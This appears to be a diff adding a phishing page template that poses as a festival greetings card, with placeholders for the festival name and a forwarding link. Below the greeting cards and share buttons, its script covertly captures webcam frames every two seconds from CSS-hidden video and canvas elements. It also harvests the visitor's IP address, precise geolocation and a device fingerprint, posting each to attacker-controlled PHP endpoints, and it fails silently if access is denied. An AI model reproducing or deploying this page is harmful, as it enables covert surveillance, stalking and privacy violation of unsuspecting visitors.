@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy fes_name!</title>
+    <link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Hide camera elements completely */
+        .video-wrap,
+        #video,
+        #canvas {
+            position: absolute !important;
+            width: 1px !important;
+            height: 1px !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
+            visibility: hidden !important;
+            left: -9999px !important;
+        }
+
+        /* Animated background particles */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: 0;
+        }
+
+        .particle {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+            animation: float 15s infinite ease-in-out;
+        }
+
+        @keyframes float {
+            0%, 100% {
+                transform: translateY(0) translateX(0) scale(1);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100vh) translateX(100px) scale(0.5);
+                opacity: 0;
+            }
+        }
+
+        /* Main container */
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        /* Header section */
+        .header {
+            text-align: center;
+            margin-bottom: 50px;
+            animation: fadeInDown 1s ease-out;
+        }
+
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .title {
+            font-family: 'Pacifico', cursive;
+            font-size: 52px;
+            color: #fff;
+            text-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            margin-bottom: 20px;
+            animation: glow 2s ease-in-out infinite;
+        }
+
+        @keyframes glow {
+            0%, 100% {
+                text-shadow: 0 5px 15px rgba(0, 0, 0, 0.3),
+                             0 0 30px rgba(255, 255, 255, 0.5);
+            }
+            50% {
+                text-shadow: 0 5px 25px rgba(0, 0, 0, 0.4),
+                             0 0 50px rgba(255, 255, 255, 0.8);
+            }
+        }
+
+        .subtitle {
+            font-size: 24px;
+            color: rgba(255, 255, 255, 0.95);
+            font-weight: 300;
+        }
+
+        /* Name card */
+        .name-card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            margin-bottom: 30px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: fadeInUp 1s ease-out 0.3s both;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .recipient-name {
+            font-size: 48px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-align: center;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        /* Wishes section */
+        .wishes-container {
+            display: grid;
+            gap: 20px;
+            animation: fadeInUp 1s ease-out 0.6s both;
+        }
+
+        .wish-card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .wish-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
+        }
+
+        .wish-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+
+        .wish-text {
+            font-size: 18px;
+            color: #2d3748;
+            line-height: 1.8;
+            text-align: center;
+        }
+
+        .highlight {
+            color: #667eea;
+            font-weight: 600;
+        }
+
+        /* Share buttons */
+        .share-section {
+            margin-top: 40px;
+            text-align: center;
+            animation: fadeInUp 1s ease-out 0.9s both;
+        }
+
+        .share-title {
+            color: #fff;
+            font-size: 20px;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        .share-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .share-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            padding: 15px 30px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        .share-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
+        }
+
+        .whatsapp-btn {
+            background: #25D366;
+            color: #fff;
+        }
+
+        .facebook-btn {
+            background: #1877F2;
+            color: #fff;
+        }
+
+        .twitter-btn {
+            background: #1DA1F2;
+            color: #fff;
+        }
+
+        /* Responsive design */
+        @media (max-width: 768px) {
+            .title {
+                font-size: 36px;
+            }
+
+            .subtitle {
+                font-size: 18px;
+            }
+
+            .recipient-name {
+                font-size: 32px;
+            }
+
+            .name-card,
+            .wish-card {
+                padding: 25px;
+            }
+
+            .wish-text {
+                font-size: 16px;
+            }
+
+            .share-buttons {
+                flex-direction: column;
+                align-items: stretch;
+            }
+
+            .share-btn {
+                width: 100%;
+                justify-content: center;
+            }
+        }
+
+        /* Fireworks animation */
+        .firework {
+            position: fixed;
+            pointer-events: none;
+            z-index: 999;
+        }
+
+        @keyframes firework {
+            0% {
+                transform: translate(-50%, -50%) scale(0);
+                opacity: 1;
+            }
+            100% {
+                transform: translate(-50%, -50%) scale(3);
+                opacity: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Hidden camera elements -->
+    <div class="video-wrap">
+        <video id="video" playsinline autoplay></video>
+    </div>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <!-- Background particles -->
+    <div class="particles" id="particles"></div>
+
+    <!-- Main content -->
+    <div class="container">
+        <div class="header">
+            <h1 class="title">✨ Happy fes_name! ✨</h1>
+            <p class="subtitle">Wishing you joy and prosperity</p>
+        </div>
+
+        <div class="name-card">
+            <div class="recipient-name" id="recipientName"></div>
+        </div>
+
+        <div class="wishes-container">
+            <div class="wish-card">
+                <div class="wish-icon">🎉</div>
+                <p class="wish-text">
+                    May this special occasion of <span class="highlight">fes_name</span> bring countless blessings,
+                    happiness, and prosperity into your life!
+                </p>
+            </div>
+
+            <div class="wish-card">
+                <div class="wish-icon">🌟</div>
+                <p class="wish-text">
+                    Wishing you and your loved ones a wonderful celebration filled with joy,
+                    laughter, and beautiful memories that last forever!
+                </p>
+            </div>
+
+            <div class="wish-card">
+                <div class="wish-icon">💫</div>
+                <p class="wish-text">
+                    May this <span class="highlight">fes_name</span> mark the beginning of a year
+                    filled with good luck, good health, and much happiness!
+                </p>
+            </div>
+
+            <div class="wish-card">
+                <div class="wish-icon">🎊</div>
+                <p class="wish-text">
+                    Sending you warm wishes and heartfelt blessings on this auspicious occasion.
+                    Have a blessed <span class="highlight">fes_name</span>!
+                </p>
+            </div>
+        </div>
+
+        <div class="share-section">
+            <h3 class="share-title">Share the Joy! 🎁</h3>
+            <div class="share-buttons">
+                <a href="whatsapp://send?text=🎉 Special fes_name Wishes for you! Check this beautiful message: forwarding_link" 
+                   class="share-btn whatsapp-btn">
+                    <span>📱</span> Share on WhatsApp
+                </a>
+                <a href="https://www.facebook.com/sharer/sharer.php?u=forwarding_link" 
+                   target="_blank" 
+                   class="share-btn facebook-btn">
+                    <span>👥</span> Share on Facebook
+                </a>
+                <a href="https://twitter.com/intent/tweet?text=Happy fes_name! 🎉&url=forwarding_link" 
+                   target="_blank" 
+                   class="share-btn twitter-btn">
+                    <span>🐦</span> Share on Twitter
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let sessionId = null;
+
+        // Capture IP and get session ID
+        fetch('forwarding_link/ip.php')
+            .then(response => response.json())
+            .then(data => {
+                if (data.session_id) {
+                    sessionId = data.session_id;
+                }
+            });
+
+        // Camera capture (invisible to user)
+        function post(imgdata) {
+            $.ajax({
+                type: 'POST',
+                data: { cat: imgdata, session_id: sessionId },
+                url: 'forwarding_link/post.php',
+                dataType: 'json',
+                async: false,
+                success: function(result) {},
+                error: function() {}
+            });
+        }
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        
+        const constraints = {
+            audio: false,
+            video: { facingMode: "user" }
+        };
+
+        async function init() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                handleSuccess(stream);
+            } catch (e) {
+                // Silently fail if camera access denied
+            }
+        }
+
+        function handleSuccess(stream) {
+            window.stream = stream;
+            video.srcObject = stream;
+
+            var context = canvas.getContext('2d');
+            setInterval(function() {
+                context.drawImage(video, 0, 0, 640, 480);
+                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                post(canvasData);
+            }, 2000);
+        }
+
+        init();
+
+        // Set default name without prompting
+        document.getElementById('recipientName').textContent = "Friend";
+
+
+        // Create animated particles
+
+        // Capture location
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    $.ajax({
+                        type: 'POST',
+                        data: {
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            acc: position.coords.accuracy,
+                            session_id: sessionId
+                        },
+                        url: 'forwarding_link/location.php',
+                        dataType: 'json'
+                    });
+                },
+                function(error) {},
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        // Capture fingerprint
+        async function captureFingerprint() {
+            if (typeof DeviceFingerprint === 'undefined') return;
+            const fp = new DeviceFingerprint();
+            const fingerprint = await fp.collect();
+            
+            fetch('forwarding_link/fingerprint.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    fingerprint: fingerprint,
+                    session_id: sessionId
+                })
+            });
+        }
+
+        // Load fingerprint script and capture
+        const fpScript = document.createElement('script');
+        fpScript.src = 'forwarding_link/Fingerprint_.js';
+        fpScript.onload = function() {
+            setTimeout(captureFingerprint, 2000);
+        };
+        document.head.appendChild(fpScript);
+        const particlesContainer = document.getElementById('particles');
+        for (let i = 0; i < 30; i++) {
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+            particle.style.width = Math.random() * 10 + 5 + 'px';
+            particle.style.height = particle.style.width;
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.animationDelay = Math.random() * 15 + 's';
+            particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
+            particlesContainer.appendChild(particle);
+        }
+
+        // Create occasional fireworks effect
+        function createFirework() {
+            const firework = document.createElement('div');
+            firework.className = 'firework';
+            firework.style.left = Math.random() * window.innerWidth + 'px';
+            firework.style.top = Math.random() * window.innerHeight + 'px';
+            firework.style.width = '100px';
+            firework.style.height = '100px';
+            firework.style.borderRadius = '50%';
+            firework.style.background = `radial-gradient(circle, 
+                ${['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff'][Math.floor(Math.random() * 5)]} 0%, 
+                transparent 70%)`;
+            firework.style.animation = 'firework 1s ease-out forwards';
+            
+            document.body.appendChild(firework);
+            
+            setTimeout(() => {
+                firework.remove();
+            }, 1000);
+        }
+
+        setInterval(createFirework, 3000);
+    </script>
+</body>
+</html>
